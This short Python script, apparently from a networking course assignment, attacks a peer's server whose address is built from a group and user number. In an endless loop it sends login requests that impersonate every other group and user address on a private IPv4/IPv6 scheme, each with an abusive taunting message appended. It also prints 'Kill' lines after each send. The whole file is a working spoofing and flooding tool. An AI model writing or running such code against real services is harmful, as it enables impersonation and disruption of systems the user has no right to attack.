
import SocketFunc as sfunc
import Package as pack
import Function as func
import Constant as const
import TextFunc as tfunc
import sys

if (len(sys.argv)) != 3:
	print("Errore! Usa python Force.py nGroup nUser")
else:
	gt = sys.argv[1]
	ut = sys.argv[2]
	print(ut)
	while(True):

		for group in range(0, 15):
			for user in range(0, 5):
				print("Try to fuck " + gt + " - " + ut)
				s = sfunc.create_socket_client(func.roll_the_dice("172.030." + tfunc.format_string(gt, const.LENGTH_SECTION_IPV4, "0") + 
						"." + tfunc.format_string(ut, const.LENGTH_SECTION_IPV4, "0") + 
						"|fc00:0000:0000:0000:0000:0000:" + tfunc.format_string(gt, const.LENGTH_SECTION_IPV6, "0") + 
						":" + tfunc.format_string(ut, const.LENGTH_SECTION_IPV6, "0")), const.TPORT)
				if s is not None:
					pk = pack.request_login("172.030." + tfunc.format_string(str(group), const.LENGTH_SECTION_IPV4, "0") + 
						"." + tfunc.format_string(str(user), const.LENGTH_SECTION_IPV4, "0") + 
						"|fc00:0000:0000:0000:0000:0000:" + tfunc.format_string(str(group), const.LENGTH_SECTION_IPV6, "0") + 
						":" + tfunc.format_string(str(user), const.LENGTH_SECTION_IPV6, "0"))
					pk = pk + b'We fucked u, say hi to your mama!'
					s.sendall(pk)
					print("Kill " + gt + " - " + ut + " from " + str(group) + " - " + str(user) + " oh yeah!")
					s.close()